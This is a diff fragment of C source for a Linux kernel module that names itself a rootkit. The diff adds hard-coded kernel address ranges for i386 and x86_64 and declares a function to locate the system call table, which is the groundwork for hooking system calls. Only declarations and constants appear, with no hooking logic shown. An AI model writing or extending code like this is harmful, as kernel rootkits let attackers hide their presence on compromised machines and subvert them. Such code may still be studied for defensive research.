@@ -9,20 +9,30 @@
 #include <linux/syscalls.h>
 #include <linux/version.h>
 
-unsigned long syscall_table_addr;
+#if defined __i386__
+    #define START_ADDRESS 0xc0000000
+    #define END_ADDRESS 0xd0000000
+	typedef unsigned int addr_size;
+#elif defined __x86_64__
+    #define START_ADDRESS 0xffffffff81000000
+    #define END_ADDRESS 0xffffffffa2000000
+    typedef unsigned long addr_size;
+#endif
+
+static addr_size *sys_call_table_addr;
 
 /* module cleanup */
-void __exit rootkit__exit(void);
+void __exit rootkit_exit(void);
 
 /* module initialization */
-int __init rootkit__init(void);
+int __init rootkit_init(void);
 
 /**
  * Finds a system call table. This should be done during compile time
  *
  * @return 0 if success, EFAULT if failure
  */
-static int locate_syscall_table();
+static int locate_sys_call_table(void);
 
 MODULE_LICENSE("GPL");
 
